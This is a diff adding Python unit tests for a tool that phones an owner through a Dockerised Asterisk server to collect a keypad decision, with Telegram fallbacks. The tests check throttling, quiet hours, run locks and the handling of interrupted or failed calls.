+        self.assertEqual(result["status"], "decided")
+
+    def test_a_failure_while_the_call_may_be_live_leaves_the_folder_for_the_dialplan(self):
+        class Flaky(FakeAsterisk):
+            def read_file(self, path):
+                raise ceo.DockerError("cannot read call state from the Asterisk container")
+
+        asterisk = Flaky(["1"])
+        clock = FakeClock()
+        with self.assertRaises(ceo.CallError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {}, asterisk, synth=fake_synth,
+                    sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual(asterisk.originated, 1)
+        self.assertTrue(asterisk.dirs)  # not removed: the owner may be mid-confirmation; the daily sweep cleans it
+
+    def test_a_failure_before_the_call_removes_the_folder(self):
+        def failing_synth(host, port, text):
+            raise ceo.CallError("cannot get speech from the speech server")
+
+        asterisk = FakeAsterisk([])
+        with self.assertRaises(ceo.CallError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {}, asterisk, synth=failing_synth,
+                    sleep=FakeClock().sleep, clock=FakeClock(), now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual(asterisk.dirs, set())
+
+    def test_a_cleanup_failure_does_not_hide_the_real_error_or_keep_the_throttle_slot(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+
+        def failing_synth(host, port, text):
+            raise ceo.CallError("cannot get speech from the speech server")
+
+        class CleanupFails(FakeAsterisk):
+            def remove(self, *paths, **kw):
+                raise ceo.DockerError("cannot run docker")
+
+        with self.assertRaises(ceo.CallError) as caught:
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120),
+                    {}, CleanupFails([]), synth=failing_synth, sleep=FakeClock().sleep, clock=FakeClock(),
+                    now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertIn("speech", str(caught.exception))
+        self.assertEqual(state.read_text().strip(), "")
+
+    def test_a_docker_failure_after_the_digit_was_read_does_not_lose_the_decision(self):
+        class DoneFails(FakeAsterisk):
+            def read_file(self, path):
+                if path.endswith("/done") and self.files.get(path.rsplit("/", 1)[0] + "/result") is not None:
+                    raise ceo.DockerError("cannot read call state from the Asterisk container")
+                return super().read_file(path)
+
+        asterisk = DoneFails([{1: {"answered": "1"}, 3: {"result": "2"}}])
+        clock = FakeClock()
+        result = ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, attempts=1), {}, asterisk,
+                         synth=fake_synth, sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual((result["status"], result["choice"]), ("decided", 2))
+
+    def test_two_asks_in_the_same_second_keep_their_own_slots(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=0, max_per_hour=6)
+        first = ceo.check_throttle(cfg, wall=lambda: 1000.2)
+        second = ceo.check_throttle(cfg, wall=lambda: 1000.7)
+        ceo.release_throttle(cfg, second, wall=lambda: 1001.0)
+        remaining = [float(x) for x in state.read_text().split()]
+        self.assertEqual(remaining, [first])
+
+    def test_a_refund_after_a_long_run_keeps_asks_that_started_meanwhile(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=0, max_per_hour=6)
+        first = ceo.check_throttle(cfg, wall=lambda: 1000.0)
+        later = ceo.check_throttle(cfg, wall=lambda: 1000.0 + 7200)  # started two hours later (lock off)
+        ceo.release_throttle(cfg, first, wall=lambda: 1000.0 + 7300)
+        self.assertEqual([float(x) for x in state.read_text().split()], [later])
+
+    def test_a_clock_that_steps_back_does_not_reset_the_hourly_limit(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        state.write_text("".join("%d\n" % (10000 + i) for i in range(6)))
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=0, max_per_hour=6)
+        with self.assertRaises(ceo.CallError):
+            ceo.check_throttle(cfg, wall=lambda: 9000.0)  # the clock is now before the recorded starts
+
+    def test_sigterm_mid_call_messages_the_owner_and_leaves_the_folder(self):
+        import signal as _signal
+
+        class Terminated(FakeAsterisk):
+            def read_file(self, path):
+                if not getattr(self, "killed", False):
+                    self.killed = True
+                    os.kill(os.getpid(), _signal.SIGTERM)
+                return super().read_file(path)
+
+        previous = _signal.getsignal(_signal.SIGTERM)
+        self.addCleanup(_signal.signal, _signal.SIGTERM, previous)
+        ceo.exit_cleanly_on_sigterm()
+        sent = []
+        asterisk = Terminated(["unanswered"])
+        clock = FakeClock()
+        with self.assertRaises(ceo.CallError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                    asterisk, synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                    sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual(len(sent), 1)  # the owner is told the decision is still pending
+        self.assertTrue(asterisk.dirs)  # a live call keeps its folder
+
+    def test_the_prompts_share_one_speech_budget(self):
+        clock = FakeClock()
+        calls = []
+
+        def slow_synth(host, port, text):
+            calls.append(text)
+            clock.sleep(100)
+            return fake_synth(host, port, text)
+
+        asterisk = FakeAsterisk([])
+        with self.assertRaises(ceo.CallError) as caught:
+            ceo.ask({"question": "q", "options": ["a", "b", "c", "d", "e", "f", "g", "h"]}, dict(ceo.DEFAULT_CONFIG), {}, asterisk,
+                    synth=slow_synth, sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertIn("speech took too long", str(caught.exception))
+        self.assertLessEqual(len(calls), 5)
+        self.assertEqual(asterisk.originated, 0)
+
+    def test_an_unregistered_phone_still_uses_up_the_throttle_slot(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        original = FakeAsterisk.__init__
+
+        def init(self_, script):
+            original(self_, script)
+            self_.registered = False
+
+        FakeAsterisk.__init__ = init
+        try:
+            result, asterisk, _ = run_ask([], env={"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                                          config={"state_file": str(state), "min_gap_s": 120, "heads_up_s": 4})
+            self.assertEqual(result["reason"], "phone_not_registered")
+            with self.assertRaises(ceo.CallError):  # a loop of "call again" briefs cannot spam heads-up messages
+                run_ask([], config={"state_file": str(state), "min_gap_s": 120, "heads_up_s": 4})
+        finally:
+            FakeAsterisk.__init__ = original
+
+    def test_a_call_that_timed_out_while_open_keeps_its_folder(self):
+        result, asterisk, _ = run_ask([{1: {"answered": "1"}}], config={"call_timeout_s": 60, "attempts": 1})
+        self.assertEqual(result["status"], "timeout")
+        self.assertTrue(asterisk.dirs)  # the owner may still be on the line; the daily sweep cleans it later
+
+    def test_a_second_ask_cannot_start_while_another_is_running(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), lock_file=str(state) + ".lock", min_gap_s=0, max_per_hour=0)
+        first = ceo.acquire_run_lock(cfg)
+        try:
+            with self.assertRaises(ceo.CallError) as caught:
+                ceo.acquire_run_lock(cfg)
+            self.assertIn("still running", str(caught.exception))
+        finally:
+            first.close()
+        ceo.acquire_run_lock(cfg).close()  # free again once the first run ended
+
+    def test_ask_holds_the_run_lock_for_its_whole_run(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        cfg = {"state_file": str(state), "lock_file": str(state) + ".lock", "min_gap_s": 0, "max_per_hour": 0}
+        seen = []
+        original = FakeAsterisk.originate
+
+        def spy(self_, name, call_file, before_commit=None):
+            try:
+                ceo.acquire_run_lock(dict(ceo.DEFAULT_CONFIG, **cfg)).close()
+                seen.append("free")
+            except ceo.CallError:
+                seen.append("held")
+            original(self_, name, call_file, before_commit)
+
+        FakeAsterisk.originate = spy
+        try:
+            run_ask(["1"], config=cfg)
+        finally:
+            FakeAsterisk.originate = original
+        self.assertEqual(seen, ["held"])
+        ceo.acquire_run_lock(dict(ceo.DEFAULT_CONFIG, **cfg)).close()  # released afterwards
+
+    def test_an_asleep_phone_without_a_heads_up_gives_the_slot_back(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        original = FakeAsterisk.__init__
+
+        def init(self_, script):
+            original(self_, script)
+            self_.registered = False
+
+        FakeAsterisk.__init__ = init
+        try:
+            result, _, sent = run_ask([], config={"state_file": str(state), "min_gap_s": 120, "heads_up_s": 0})
+        finally:
+            FakeAsterisk.__init__ = original
+        self.assertEqual((result["reason"], sent), ("phone_not_registered", []))
+        self.assertEqual(state.read_text().strip(), "")  # nothing reached the owner, so no slot is used
+
+    def test_a_ctrl_c_or_unexpected_error_mid_call_keeps_the_folder_and_messages_the_owner(self):
+        for exc in (KeyboardInterrupt, RuntimeError):
+            with self.subTest(exc=exc.__name__):
+                class Boom(FakeAsterisk):
+                    def read_file(self, path):
+                        raise exc()
+
+                sent = []
+                asterisk = Boom(["1"])
+                clock = FakeClock()
+                with self.assertRaises(exc):
+                    ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                            asterisk, synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                            sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+                self.assertEqual(len(sent), 1)
+                self.assertTrue(asterisk.dirs)
+
+    def test_sigint_is_handled_like_sigterm(self):
+        import signal as _signal
+        previous = (_signal.getsignal(_signal.SIGTERM), _signal.getsignal(_signal.SIGINT))
+        self.addCleanup(lambda: [_signal.signal(sig, handler) for sig, handler in zip((_signal.SIGTERM, _signal.SIGINT), previous)])
+        ceo.exit_cleanly_on_sigterm()
+        with self.assertRaises(ceo.Interrupted):
+            os.kill(os.getpid(), _signal.SIGINT)
+            _t = __import__("time"); _t.sleep(0.2)
+
+    def test_a_clock_step_of_more_than_a_day_does_not_block_forever(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        state.write_text("%d\n" % (10**9 + 3 * 86400))
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120, max_per_hour=6)
+        ceo.check_throttle(cfg, wall=lambda: 10.0**9)  # the recorded start is days ahead: ignored
+
+    def test_a_corrupt_state_file_is_not_a_traceback_and_does_not_leak_the_lock(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        state.write_bytes(b"\xff\xfe\x00garbage\n")
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120, max_per_hour=6)
+        ceo.check_throttle(cfg, wall=lambda: 5000.0)  # unreadable lines are skipped, the ask goes through
+        result, _, _ = run_ask(["1"], config={"state_file": str(state), "min_gap_s": 0, "max_per_hour": 0})
+        self.assertEqual(result["status"], "decided")
+        ceo.acquire_run_lock(cfg).close()  # not left locked
+
+    def test_the_run_lock_is_released_when_the_throttle_check_blows_up(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        import unittest.mock as mock
+        cfg = {"state_file": str(state), "min_gap_s": 120, "max_per_hour": 6}
+        with mock.patch.object(ceo, "check_throttle", side_effect=RuntimeError("boom")):
+            with self.assertRaises(RuntimeError):
+                run_ask(["1"], config=cfg)
+        ceo.acquire_run_lock(dict(ceo.DEFAULT_CONFIG, **cfg)).close()
+
+    def throttle_state(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        return state
+
+    def test_a_phone_that_drops_after_a_call_still_keeps_the_slot(self):
+        state = self.throttle_state()
+        reads = iter([True, False])  # registered for attempt 1, gone for attempt 2
+        original = FakeAsterisk.__init__
+
+        def init(self_, script):
+            original(self_, script)
+            self_.registered = lambda: next(reads, False)
+
+        FakeAsterisk.__init__ = init
+        try:
+            result, asterisk, _ = run_ask(["unanswered"], config={"state_file": str(state), "min_gap_s": 120, "heads_up_s": 0})
+        finally:
+            FakeAsterisk.__init__ = original
+        self.assertEqual(asterisk.originated, 1)
+        self.assertEqual(result["reason"], "phone_not_registered")
+        self.assertNotEqual(state.read_text().strip(), "")  # a call rang, so the slot stays used
+
+    def test_an_error_message_to_the_owner_keeps_the_throttle_slot(self):
+        state = self.throttle_state()
+
+        def failing_synth(host, port, text):
+            raise ceo.CallError("cannot get speech from the speech server")
+
+        sent = []
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120)
+        with self.assertRaises(ceo.CallError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, cfg, {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"}, FakeAsterisk([]),
+                    synth=failing_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                    sleep=FakeClock().sleep, clock=FakeClock(), now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual(len(sent), 1)
+        self.assertNotEqual(state.read_text().strip(), "")  # looping on a broken speech server cannot spam the chat
+        with self.assertRaises(ceo.CallError) as caught:
+            ceo.ask({"question": "q", "options": ["a", "b"]}, cfg, {}, FakeAsterisk([]), synth=failing_synth,
+                    sleep=FakeClock().sleep, clock=FakeClock(), now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertIn("too soon", str(caught.exception))
+
+    def test_a_deferred_or_unregistered_notice_keeps_the_slot_too(self):
+        state = self.throttle_state()
+        original = FakeAsterisk.__init__
+
+        def init(self_, script):
+            original(self_, script)
+            self_.registered = False
+
+        FakeAsterisk.__init__ = init
+        try:
+            result, _, sent = run_ask([], env={"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                                      config={"state_file": str(state), "min_gap_s": 120, "heads_up_s": 0})
+        finally:
+            FakeAsterisk.__init__ = original
+        self.assertEqual(len(sent), 1)  # the "phone was not connected" notice
+        self.assertNotEqual(state.read_text().strip(), "")
+
+    def test_a_failed_heads_up_does_not_count_as_sent(self):
+        asterisk = FakeAsterisk([])
+        asterisk.registered = False
+        clock = FakeClock()
+        state = {}
+        config = dict(ceo.DEFAULT_CONFIG, heads_up_s=2, poll_interval_s=2)
+        ceo.wait_for_phone(asterisk, config, {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                           lambda *a, **k: False, clock.sleep, clock, state)
+        self.assertFalse(state.get("messaged"))
+
+    def test_a_stop_request_during_a_chat_send_is_not_swallowed(self):
+        def opener(request, timeout):
+            raise ceo.Interrupted("interrupted")
+
+        with self.assertRaises(ceo.Interrupted):
+            ceo.send_telegram("t", "9", "hi", opener=opener)
+
+    def test_the_state_file_is_replaced_atomically_never_left_empty(self):
+        import unittest.mock as mock
+        state = self.throttle_state()
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=0, max_per_hour=6)
+        ceo.check_throttle(cfg, wall=lambda: 1000.0)
+        before = state.read_text()
+        # A kill between "truncate" and "write" must not be able to empty the file: it is replaced whole.
+        with mock.patch.object(ceo.os, "replace", side_effect=KeyboardInterrupt):
+            with self.assertRaises(KeyboardInterrupt):
+                ceo.check_throttle(cfg, wall=lambda: 2000.0)
+        self.assertEqual(state.read_text(), before)
+
+    def test_an_error_during_a_live_call_tells_the_owner_their_answer_was_not_recorded(self):
+        class Flaky(FakeAsterisk):
+            def read_file(self, path):
+                raise ceo.DockerError("cannot read call state from the Asterisk container")
+
+        sent = []
+        clock = FakeClock()
+        with self.assertRaises(ceo.CallError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                    Flaky(["1"]), synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                    sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertIn("no se ha registrado", sent[0])
+
+    def test_a_confirmed_digit_is_recovered_when_only_one_docker_read_failed(self):
+        class OneBlip(FakeAsterisk):
+            blips = 0
+
+            def read_file(self, path):
+                if self.blips == 0:
+                    self.blips = 1
+                    raise ceo.DockerError("cannot read call state from the Asterisk container")
+                return super().read_file(path)
+
+        asterisk = OneBlip([{1: {"answered": "1", "result": "2", "done": "1"}}])
+        clock = FakeClock()
+        result = ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, attempts=1), {}, asterisk, synth=fake_synth,
+                         sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual((result["status"], result["choice"]), ("decided", 2))
+
+    def test_a_stop_request_during_cleanup_is_not_swallowed(self):
+        class StopsOnRemove(FakeAsterisk):
+            def remove(self, *paths, **kw):
+                raise ceo.Interrupted("interrupted")
+
+        clock = FakeClock()
+        with self.assertRaises(ceo.Interrupted):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, attempts=1), {}, StopsOnRemove(["1"]),
+                    synth=fake_synth, sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+
+    def test_an_unexpected_result_while_the_call_may_be_live_keeps_the_folder_and_says_so(self):
+        sent = []
+        clock = FakeClock()
+        asterisk = FakeAsterisk([{1: {"answered": "1", "result": "7"}}])  # garbage value, and no "done" marker yet
+        with self.assertRaises(ceo.MayBeLive):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, attempts=1), {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                    asterisk, synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                    sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertIn("no se ha registrado", sent[0])
+        self.assertTrue(asterisk.dirs)
+
+    def test_a_failed_marker_cleanup_means_no_call_was_placed(self):
+        class MarkerCleanupFails(FakeAsterisk):
+            def remove(self, *paths, strict=False):
+                if strict:
+                    raise ceo.DockerError("a command inside the Asterisk container failed")
+                return super().remove(*paths)
+
+        state = self.throttle_state()
+        asterisk = MarkerCleanupFails(["1"])
+        clock = FakeClock()
+        sent = []
+        with self.assertRaises(ceo.DockerError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120),
+                    {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"}, asterisk, synth=fake_synth,
+                    notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                    sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual(asterisk.originated, 0)
+        self.assertNotIn("no se ha registrado", sent[0])  # no call exists, so no "your answer" warning
+        self.assertEqual(asterisk.dirs, set())  # the folder is not kept either
+
+    def test_a_failed_originate_is_not_reported_as_a_live_call(self):
+        class OriginateFails(FakeAsterisk):
+            def originate(self, name, call_file, before_commit=None):
+                raise ceo.DockerError("a command inside the Asterisk container failed")
+
+        asterisk = OriginateFails([])
+        clock = FakeClock()
+        sent = []
+        with self.assertRaises(ceo.CallError) as caught:
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                    asterisk, synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                    sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertNotIsInstance(caught.exception, ceo.MayBeLive)
+        self.assertNotIn("no se ha registrado", sent[0])
+        self.assertEqual(asterisk.dirs, set())
+
+    def test_a_recovered_decision_reports_the_attempt_it_came_from(self):
+        class SecondAttemptBlip(FakeAsterisk):
+            def read_file(self, path):
+                if self.originated == 2 and not getattr(self, "blipped", False):
+                    self.blipped = True
+                    raise ceo.DockerError("cannot read call state from the Asterisk container")
+                return super().read_file(path)
+
+        asterisk = SecondAttemptBlip(["unanswered", {1: {"answered": "1", "result": "1", "done": "1"}}])
+        clock = FakeClock()
+        result = ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, attempts=3), {}, asterisk,
+                         synth=fake_synth, sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual((result["status"], result["choice"], result["attempt"]), ("decided", 1, 2))
+        self.assertTrue(asterisk.dirs)  # the call may still be playing its thank-you: the folder is left for the sweep
+
+    def test_a_stop_request_after_a_confirmed_key_press_still_returns_the_choice(self):
+        class Killed(FakeAsterisk):
+            killed = False
+
+            def read_file(self, path):
+                value = super().read_file(path)
+                if path.endswith("/result") and value and not self.killed:
+                    self.killed = True
+                    raise ceo.Interrupted("interrupted")  # the stop request lands right after the digit was written
+                return value
+
+        asterisk = Killed([{1: {"answered": "1", "result": "2"}}])
+        clock = FakeClock()
+        result = ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, attempts=1), {}, asterisk, synth=fake_synth,
+                         sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual((result["status"], result["choice"]), ("decided", 2))
+
+    def test_starts_far_in_the_future_after_a_clock_correction_are_ignored(self):
+        state = self.throttle_state()
+        state.write_text("".join("%d\n" % (100000 + 7200 + i) for i in range(6)))  # two hours ahead of "now"
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120, max_per_hour=6)
+        ceo.check_throttle(cfg, wall=lambda: 100000.0)
+
+    def test_quiet_hours_deferrals_cannot_be_used_to_spam_the_chat(self):
+        state = self.throttle_state()
+        cfg = {"state_file": str(state), "min_gap_s": 120, "quiet_start": "23:00", "quiet_end": "08:00"}
+        env = {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"}
+        result, asterisk, sent = run_ask([], env=env, config=cfg, clock_time=(3, 0))
+        self.assertEqual((result["status"], len(sent)), ("deferred", 1))
+        self.assertNotEqual(state.read_text().strip(), "")  # the silent message used the slot
+        with self.assertRaises(ceo.CallError) as caught:  # the second one in a loop is refused, no second message
+            run_ask([], env=env, config=cfg, clock_time=(3, 0))
+        self.assertIn("too soon", str(caught.exception))
+
+    def test_a_timeout_after_the_call_file_may_have_moved_is_a_possibly_live_call(self):
+        for error in (ceo.DockerTimeout("cannot run docker"), ceo.Interrupted("interrupted")):
+            with self.subTest(error=type(error).__name__):
+                class Slow(FakeAsterisk):
+                    def originate(self, name, call_file, before_commit=None):
+                        raise error
+
+                sent = []
+                asterisk = Slow([])
+                clock = FakeClock()
+                with self.assertRaises(ceo.MayBeLive):
+                    ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                            asterisk, synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                            sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+                self.assertIn("no se ha registrado", sent[0])
+                self.assertTrue(asterisk.dirs)  # the phone may be ringing: the prompts stay
+
+    def test_a_docker_exec_timeout_is_told_apart_from_a_plain_failure(self):
+        import subprocess as _sp
+
+        def timing_out(command, **kwargs):
+            raise _sp.TimeoutExpired(command, 60)
+
+        with self.assertRaises(ceo.DockerTimeout):
+            ceo.DockerAsterisk("asterisk", run=timing_out).make_dir("/x")
+
+    def test_a_stop_request_during_the_recovery_read_is_not_swallowed(self):
+        class Both(FakeAsterisk):
+            def read_file(self, path):
+                if path.endswith("/result") and getattr(self, "armed", False):
+                    raise ceo.Interrupted("interrupted")
+                if not getattr(self, "armed", False):
+                    self.armed = True
+                    raise ceo.DockerError("cannot read call state from the Asterisk container")
+                return super().read_file(path)
+
+        clock = FakeClock()
+        with self.assertRaises(ceo.Interrupted):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, attempts=1), {}, Both(["1"]), synth=fake_synth,
+                    sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+
+    def test_a_failed_cleanup_before_attempt_two_does_not_claim_a_live_call(self):
+        class SecondCleanupFails(FakeAsterisk):
+            strict_calls = 0
+
+            def remove(self, *paths, strict=False):
+                if strict:
+                    self.strict_calls += 1
+                    if self.strict_calls == 2:
+                        raise ceo.DockerError("a command inside the Asterisk container failed")
+                return super().remove(*paths)
+
+        sent = []
+        asterisk = SecondCleanupFails(["unanswered"])
+        clock = FakeClock()
+        with self.assertRaises(ceo.DockerError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, attempts=2),
+                    {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"}, asterisk, synth=fake_synth,
+                    notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                    sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual(asterisk.originated, 1)
+        self.assertNotIn("no se ha registrado", sent[0])  # attempt 1 was over: nothing is live
+        self.assertEqual(asterisk.dirs, set())
+
+    def test_quiet_hours_beginning_during_synthesis_stop_the_first_attempt_before_the_heads_up(self):
+        times = iter([(21, 58), (22, 1), (22, 1), (22, 1)])  # start, then the window opens before the first attempt
+        original = FakeAsterisk.__init__
+
+        def init(self_, script):
+            original(self_, script)
+            self_.registered = False
+
+        sent = []
+        FakeAsterisk.__init__ = init
+        try:
+            asterisk = FakeAsterisk([])
+            cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, attempts=1, quiet_start="22:00", quiet_end="08:00", heads_up_s=90)
+            clock = FakeClock()
+            result = ceo.ask({"question": "q", "options": ["a", "b"]}, cfg, {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                             asterisk, synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append((text, silent)) or True,
+                             sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, *next(times)))
+        finally:
+            FakeAsterisk.__init__ = original
+        self.assertEqual(result["status"], "deferred")
+        self.assertTrue(all(silent for _, silent in sent))  # nothing loud inside the window, and no heads-up
+
+    def test_notices_sent_after_the_window_opened_are_silent(self):
+        times = iter([(21, 59), (21, 59), (21, 59), (22, 20), (22, 20), (22, 20)])
+        sent = []
+        asterisk = FakeAsterisk(["unanswered"])
+        cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, attempts=1, quiet_start="22:00", quiet_end="08:00")
+        clock = FakeClock()
+        result = ceo.ask({"question": "q", "options": ["a", "b"]}, cfg, {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                         asterisk, synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(silent) or True,
+                         sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, *next(times, (22, 20))))
+        self.assertEqual(result["status"], "unanswered")
+        self.assertEqual(sent, [True])
+
+    def test_a_stop_request_while_reporting_an_unexpected_error_is_not_swallowed(self):
+        class Boom(FakeAsterisk):
+            def read_file(self, path):
+                raise RuntimeError("bug")
+
+        def stopping_notifier(token, chat, text, silent=False):
+            raise ceo.Interrupted("interrupted")
+
+        clock = FakeClock()
+        with self.assertRaises(ceo.Interrupted):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, attempts=1), {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                    Boom(["1"]), synth=fake_synth, notifier=stopping_notifier, sleep=clock.sleep, clock=clock,
+                    now=lambda: datetime(2026, 1, 1, 12, 0))
+
+    def test_a_daily_cap_stops_a_loop_that_stays_under_the_hourly_cap(self):
+        state = self.throttle_state()
+        now = 90000.0
+        # 24 asks spread over the last day, none in the last hour
+        state.write_text("".join("%.6f\n" % (now - 4000 - i * 3000) for i in range(24)))
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=0, max_per_hour=6, max_per_day=24)
+        with self.assertRaises(ceo.CallError) as caught:
+            ceo.check_throttle(cfg, wall=lambda: now)
+        self.assertIn("too many", str(caught.exception))
+        ceo.check_throttle(dict(cfg, max_per_day=25), wall=lambda: now)
+        ceo.check_throttle(dict(cfg, max_per_day=0), wall=lambda: now)  # off
+
+    def test_council_command_policy_and_agent_name_the_same_two_triggers(self):
+        root = SCRIPT.parents[2]
+        texts = {
+            "command": (root / ".." / "commands" / "council.md").read_text(),
+            "policy": (root / "council-policy" / "SKILL.md").read_text(),
+            "agent": (root / ".." / "agents" / "claudio.md").read_text(),
+        }
